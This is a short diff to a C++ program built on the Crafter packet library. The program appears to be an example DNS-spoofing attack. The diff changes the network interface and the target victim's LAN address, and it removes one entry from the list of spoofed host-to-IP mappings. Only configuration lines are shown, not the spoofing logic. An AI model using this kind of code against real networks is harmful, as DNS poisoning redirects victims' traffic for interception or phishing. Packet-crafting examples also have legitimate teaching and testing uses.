@@ -58,17 +58,16 @@ int main() {
 	InitCrafter();
 
 	/* Set the interface */
-	string iface = "wlan0";
+	string iface = "eth0";
 
 	/* Create a structure with information about the attack */
 	HostInfo* host_info = new HostInfo;
 
 	/* IP addresses -> This is a data supply by the user */
 	string dns_ip = "192.168.0.1"; short_word dst_port = 53; /* DNS traffic */
-	string victim_ip = "192.168.0.108";
+	string victim_ip = "192.168.0.104";
 
 	/* List of addresses -> This also is data supplied by the user */
-	spoof_list["google"] = "1.2.3.4";
 	spoof_list["proxy"] = "3.3.3.3";
 
 	/* Create a HostInfo structure */
